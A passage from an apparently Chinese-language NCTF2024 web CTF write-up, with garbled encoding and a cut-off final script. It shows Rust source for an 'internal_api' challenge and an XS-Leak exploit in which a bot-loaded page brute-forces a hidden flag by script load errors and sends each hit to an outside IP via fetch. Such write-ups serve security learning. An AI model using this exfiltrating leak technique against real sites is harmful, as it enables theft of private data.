src="/2025/04/07/NCTF2024-web-wp/image-20250324163038819.png" class="" title="This is an example image"><img src="/2025/04/07/NCTF2024-web-wp/image-20250324163048671.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;b67eecfa-d24d-4061-8dd1-4bdfa7a2f938&#125;</span><br></pre></td></tr></table></figure><h2 id="internal-api"><a href="#internal-api" class="headerlink" title="internal_api"></a>internal_api</h2><p>rustè¯­è¨€çš„ã€‚</p><p>å…ˆçœ‹çœ‹æºç ï¼Œmain.rsï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::&#123;env, net::SocketAddr, sync::Arc&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> axum::&#123;</span><br><span class="line">    Router,</span><br><span class="line">    routing::&#123;get, post&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">use</span> internal_api::&#123;db, route&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::net::TcpListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[tokio::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">db_name</span> = env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;DB_NAME&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">json_name</span> = env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;JSON_NAME&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">flag</span> = env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;FLAG&quot;</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = db::<span class="title function_ invoke__">init</span>(db_name, json_name, flag)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">app</span> = Router::<span class="title function_ invoke__">new</span>()</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&quot;</span>, <span class="title function_ invoke__">get</span>(route::index))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/report&quot;</span>, <span class="title function_ invoke__">post</span>(route::report))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/search&quot;</span>, <span class="title function_ invoke__">get</span>(route::public_search))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/internal/search&quot;</span>, <span class="title function_ invoke__">get</span>(route::private_search))</span><br><span class="line">        .<span class="title function_ invoke__">with_state</span>(Arc::<span class="title function_ invoke__">new</span>(pool));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">addr</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>, env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;HOST&quot;</span>)?, env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;PORT&quot;</span>)?);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">listener</span> = TcpListener::<span class="title function_ invoke__">bind</span>(addr).<span class="keyword">await</span>?;</span><br><span class="line">    axum::<span class="title function_ invoke__">serve</span>(</span><br><span class="line">        listener,</span><br><span class="line">        app.into_make_service_with_connect_info::&lt;SocketAddr&gt;(),</span><br><span class="line">    )</span><br><span class="line">    .<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>router.rsï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::&#123;net::SocketAddr, sync::Arc&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> anyhow::anyhow;</span><br><span class="line"><span class="keyword">use</span> axum::&#123;</span><br><span class="line">    Form, Json,</span><br><span class="line">    extract::&#123;ConnectInfo, Query, State&#125;,</span><br><span class="line">    response::Html,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">use</span> serde_json::&#123;Value, json&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::task;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> crate::&#123;</span><br><span class="line">    bot,</span><br><span class="line">    db::&#123;<span class="keyword">self</span>, DbPool&#125;,</span><br><span class="line">    error::AppError,</span><br><span class="line">    model::&#123;Report, Search&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>() <span class="punctuation">-&gt;</span> Html&lt;<span class="type">String</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">content</span> = <span class="built_in">include_str!</span>(<span class="string">&quot;../public/index.html&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Html</span>(content.<span class="title function_ invoke__">to_string</span>())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">report</span>(<span class="title function_ invoke__">Form</span>(report): Form&lt;Report&gt;) <span class="punctuation">-&gt;</span> Json&lt;Value&gt; &#123;</span><br><span class="line">    task::<span class="title function_ invoke__">spawn</span>(<span class="keyword">async</span> <span class="keyword">move</span> &#123; bot::<span class="title function_ invoke__">visit_url</span>(report.url).<span class="keyword">await</span>.<span class="title function_ invoke__">unwrap</span>() &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Json</span>(json!(&#123;</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: <span class="string">&quot;bot will visit the url soon&quot;</span></span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">public_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = pool.<span class="title function_ invoke__">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">false</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">private_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">    <span class="title function_ invoke__">ConnectInfo</span>(addr): ConnectInfo&lt;SocketAddr&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="comment">// ä»¥ä¸‹ä¸¤ä¸ª if ä¸é¢˜ç›®æ— å…³, ä½ åªéœ€è¦çŸ¥é“: private_search è·¯ç”±ä»…æœ‰ bot æ‰èƒ½è®¿é—®</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœ¬åœ°ç¯å¢ƒ (docker compose)</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bot_ip</span> = tokio::net::<span class="title function_ invoke__">lookup_host</span>(<span class="string">&quot;bot:4444&quot;</span>).<span class="keyword">await</span>?.<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> addr.<span class="title function_ invoke__">ip</span>() != bot_ip.<span class="title function_ invoke__">ip</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;only bot can access&quot;</span>).<span class="title function_ invoke__">into</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿œç¨‹ç¯å¢ƒ (k8s)</span></span><br><span class="line">    <span class="comment">// if !addr.ip().is_loopback() &#123;</span></span><br><span class="line">    <span class="comment">//     return Err(anyhow!(&quot;only bot can access&quot;).into());</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">true</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>/internal/search</code>æ˜¯<code>private_search</code>ï¼Œåªå…è®¸botè®¿é—®ã€‚ä¸”æ­¤å¤„çš„db::searchçš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºtrueï¼Œä»£è¡¨äº†å…è®¸æœç´¢flagã€‚</p><p>db.rsï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::&#123;fs, path::Path&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> r2d2::&#123;Pool, PooledConnection&#125;;</span><br><span class="line"><span class="keyword">use</span> r2d2_sqlite::SqliteConnectionManager;</span><br><span class="line"><span class="keyword">use</span> rusqlite::params;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">type</span> <span class="title class_">DbPool</span> = Pool&lt;SqliteConnectionManager&gt;;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">type</span> <span class="title class_">DbConn</span> = PooledConnection&lt;SqliteConnectionManager&gt;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">init</span>(db_name: <span class="type">String</span>, json_name: <span class="type">String</span>, flag: <span class="type">String</span>) <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;DbPool&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> Path::<span class="title function_ invoke__">new</span>(&amp;db_name).<span class="title function_ invoke__">exists</span>() &#123;</span><br><span class="line">        fs::<span class="title function_ invoke__">remove_file</span>(&amp;db_name)?;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">manager</span> = SqliteConnectionManager::<span class="title function_ invoke__">file</span>(db_name);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = Pool::<span class="title function_ invoke__">new</span>(manager)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">content</span> = fs::<span class="title function_ invoke__">read_to_string</span>(json_name)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span>: <span class="type">Vec</span>&lt;<span class="type">String</span>&gt; = serde_json::<span class="title function_ invoke__">from_str</span>(&amp;content)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">        <span class="string">&quot;CREATE TABLE comments(content TEXT, hidden BOOLEAN)&quot;</span>,</span><br><span class="line">        params![],</span><br><span class="line">    )?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">comment</span> <span class="keyword">in</span> comments &#123;</span><br><span class="line">        conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">            <span class="string">&quot;INSERT INTO comments(content, hidden) VALUES(?, ?)&quot;</span>,</span><br><span class="line">            params![comment, <span class="literal">false</span>],</span><br><span class="line">        )?;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">        <span class="string">&quot;INSERT INTO comments(content, hidden) VALUES(?, ?)&quot;</span>,</span><br><span class="line">        params![flag, <span class="literal">true</span>],</span><br><span class="line">    )?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(pool)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">search</span>(conn: DbConn, query: <span class="type">String</span>, hidden: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stmt</span> =</span><br><span class="line">        conn.<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM comments WHERE content LIKE ? AND hidden = ?&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = stmt</span><br><span class="line">        .<span class="title function_ invoke__">query_map</span>(params![<span class="built_in">format!</span>(<span class="string">&quot;%&#123;&#125;%&quot;</span>, query), hidden], |row| &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(row.<span class="title function_ invoke__">get</span>(<span class="number">0</span>)?)</span><br><span class="line">        &#125;)?</span><br><span class="line">        .collect::&lt;rusqlite::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;&gt;()?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(comments)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ç›®å‰çš„æ€è·¯å°±æ˜¯è®©botå»è®¿é—®&#x2F;internal&#x2F;searchæ¥è·å–flagã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">true</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœèƒ½æœç´¢åˆ°commentsï¼Œé‚£ä¹ˆå°±è¿”å›200ï¼Œå¦åˆ™è¿”å›Erré”™è¯¯ã€‚ä»–å¹¶æ²¡æœ‰å›æ˜¾ï¼Œåªæ˜¯è¿”å›ä¸€ç§çŠ¶æ€ã€‚</p><p>è¿™é“é¢˜çš„é‡ç‚¹å…¶å®å°±åœ¨äºæ­¤ï¼XS-Leaksæœ‰ä¸€ç§åŸºäºé”™è¯¯çš„æ”»å‡»ã€‚<a href="https://blog.csdn.net/allway2/article/details/126703565">https://blog.csdn.net/allway2/article/details/126703565</a></p><p>ä¸”æˆ‘ä»¬çœ‹åˆ°è¿™é‡Œçš„<code>db::search</code>å®ç°çš„æ˜¯ä¸€ç§æ¨¡ç³ŠæŸ¥è¯¢ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼</p><p>æˆ‘ä»¬ç”¨åŸºæœ¬çš„pocè¯•è¯•ï¼šæ­¤æ—¶æ˜¯éœ€è¦ç”¨åˆ°csrfçš„ï¼Œåœ¨&#x2F;reportè·¯ç”±ä¸­ç»™è®©botå»è®¿é—®æˆ‘ä»¬æ„é€ çš„æ¶æ„htmlï¼Œå†ä»¥botçš„èº«ä»½å»è¿›è¡Œç›¸å…³è¡Œä¸ºã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Error-Based Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">checkError</span>(<span class="params">url</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        script.<span class="property">src</span> = url</span></span><br><span class="line"><span class="language-javascript">        script.<span class="property">onload</span> = <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://8.130.172.38:8000/1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://8.130.172.38:8000/2&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">checkError</span>(<span class="string">&#x27;http://0.0.0.0:8000/internal/search?s=flag&#123;&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">checkError</span>(<span class="string">&#x27;http://0.0.0.0:8000/internal/search?s=somethingwrong&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">checkError</span>(<span class="string">&#x27;http://0.0.0.0:8000/internal/search?s=nctf&#123;&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">probeError</span>(<span class="params">flag</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> url = <span class="string">&#x27;http://127.0.0.1:8000/internal/search?s=&#x27;</span> + flag;</span><br><span class="line"><span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = url;</span><br><span class="line">script.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://8.130.172.38:8000/?flag=&#x27;</span> + flag, &#123; <span class="attr">mode</span>:<span class="string">&#x27;no-cors&#x27;</span> &#125;);</span><br><span class="line"><span class="title function_">leak</span>(flag);</span><br><span class="line">script.<span class="title function_">remove</span>();</span><br><span class="line">&#125;;</span><br><span class="line">script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> script.<span class="title function_">remove</span>();</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> dicts = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">flag</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dicts.<span class="property">length</span>; i++) &#123;</span><br><span class="line"><span class="keyword">let</span> char = dicts[i];</span><br><span class="line"><span class="title function_">probeError</span>(flag + char);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">leak</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Error-Based Attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        let currentFlag = &quot;&quot;;</span><br><span class="line">        const chars = &quot;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        function sleep(ms) &#123;</span><br><span class="line">            return new Promise(resolve =&gt; setTimeout(resolve, ms));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function checkCharacter(char) &#123;</span><br><span class="line">            return new Promise((resolve) =&gt; &#123;</span><br><span class="line">                let script = document.createElement(&#x27;script&#x27;);</span><br><span class="line">                script.src = 